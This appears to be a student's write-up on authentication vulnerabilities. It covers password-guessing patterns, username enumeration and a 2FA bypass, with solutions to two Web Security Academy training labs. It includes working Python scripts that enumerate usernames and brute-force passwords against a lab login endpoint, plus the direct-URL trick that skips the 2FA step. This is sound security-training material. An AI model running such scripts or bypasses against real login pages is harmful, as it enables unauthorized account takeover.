# Authentication Vulnerabilities

Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality, this is why it is important to understand where authentication is used as they present an increasingly large attack surface for distributed systems.

## The difference between Authentication and Authorization

Authentication is determining that someone trying to access a system with a specific username (or any different kind of identifier) is the same person who created the account (or is the one who owns the account). When this account is authenticated, the user is authorised to take specific actions or allowed access to data based on the permissions given to this account.

## Brute-forcing

Brute-forcing is a common way of bypassing authentication checks. By finding pubicly available information it is possible to make even better guesses when conducting such an attack.

Finding username is a good first approach to limit the possibilities. Often business logins follow some pattern in e-mail addresses for example. The same applies for highly privileged accounts like `admin/administrator`.

When it comes to passwords, looking at human behavior is a great way to create even better educated guessess for bruteforcing. Users often try to make their passwords memorable instead of choosing a truly random password. This means that the password are constructed in a way which conforms to password policy with predictable patterns like: `Mypassword1!` if the policy requires:

- Atleast one Upper case letter
- Atleast one numeric character
- Atleast one special character

Furhtermore if the password policy requires users to freqeuntly change their password, the passwords often change in a predictable manner:

- First month: `Mypassword1!`
- Second month: `Mypassword2!`

### Enumeration

When brute-forcing it is preferable to have a list of valid usernames for the system the attacker is trying to break in to. Username enumeration is a practice where the attacker is able to observe some change in a systems behavior to identify if the username used, is valid.

**Status codes**: When trying to brute-force a system, such as a website the returned HTTP status codes might change depending on the username being correct. Most guesses will be wrong and thus have the same status code, which is why a different status code can be a strong indication that the username was correct.

**Error messages**: When logging in to a system and the username or password is incorrect it is often seen that an error message is displayed. Sometimes this message changes depending on the username or password being incorrect. Even just a small typing mistake can be an indicator that the username was correct.

**Response times**: Most of the request during a brute-force attack will be handled with a similar response time where the username and password is incorrect. An application will check if a user exists before checking the password which means that the computing time increases if the username is correct, thus the response will take longer, indicating a correct username.

## Lab: Username enumeration via different responses

**Lab Description**: This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- Candidate Username (In this directory, usernames.txt)
- Candidate Passwords (In this directory, passwords.txt)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Lab solution

To determine which username is a valid user, the usernames list is used together with a simple (and messy) python script. The script uses python requests to send each username to the server on `/login`.
The server accepts the username and password as formdata, thus the weird formatting in the payload:

``` python
correct_usernames = []
session = requests.Session()
with open("./usernames.txt", "r") as usernames:
    for username in usernames:
        print(username, end="")
        payload = {
            'username': (None, username.strip()),
            'password': (None,"hej")
        }
        r = session.post("https://0ac6008604562a7c87cdcf2500410055.web-security-academy.net/login", payload)
        soup = BeautifulSoup(r.text, features="lxml")
        response_check = soup.find("p", {"class": "is-warning"})
        if(response_check.get_text() == "Incorrect password"):
            correct_usernames.append(username.strip())
print("\nCorrect Username: ", correct_usernames)

```

The approach taken in the script is valid, since the website changes the contents of the HTML if the username exists in the database. The HTML looks as follows:

``` HTML
<p class="is-warning">Invalid username</p>
<form class="login-form" method="POST" action="/login">
    <label>Username</label>
    <input required="" type="username" name="username" autofocus="">
    <label>Password</label>
    <input required="" type="password" name="password">
    <button class="button" type="submit"> Log in </button>
</form>
```

Where the `is-warning` class is used to render the response from the server. If the username exists the tag will contain `Incorrect password`.

When the username has been determined, the next part of the script uses the password list to brute-force the correct one.

``` python
correct_passwords = []
with open("./passwords.txt", "r") as passwords:
    for password in passwords:
        print(password, end="")
        payload = {
            'username': (None, correct_usernames[0]),#correct_usernames[0]),
            'password': (None, password.strip())
        }
        r = session.post("https://0ac6008604562a7c87cdcf2500410055.web-security-academy.net/login", payload)
        soup = BeautifulSoup(r.text, features="lxml")
        response_check = soup.find("p", {"class": "is-warning"})
        if not(response_check):
            correct_passwords.append(password.strip())

print("\n Correct passwords", correct_passwords)
```

Here it is assumed that the `is-warning` class will not be rendered upon a succesfull login. Using the script will output first the correct username and password. Each time the lab is spawned it will pick a random combination, however the combination i got was:

- Username: `apps`
- Password: `monitor`

Logging in with these credentials solves the lab.

## Bypassing Two-factor Authentication

Sometimes, when a site uses two-factor authentication and the authentication step introduces a second (or separate) page for the verification, the system already considers the user to be in a "Logged-in" state. This means that the verification step can be skipped.

## Lab: 2FA simple bypass

**Lab Description**:  This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials:`wiener:peter`
- Victim's credentials: `carlos:montoya`

### Lab solution

This lab is quite simple. Provided with two accounts and an email client, when trying to login with `wiener:peter`, the website prompts for a four digit verification code. Going to the email client to retrieve the code and submitting it, makes the site continue to the `my account` page. From the url it is seen that the account id's are the usernames: `https://0af4003c04e7fe10818876f700cd00d7.web-security-academy.net/my-account?id=wiener`.

With this knowledge, attempting to login to with `carlos:montoya` is effective and bypassing the 2FA is possible by going to `/my-account?id=carlos` after the first login step (When at the 2FA page). This solves the lab.
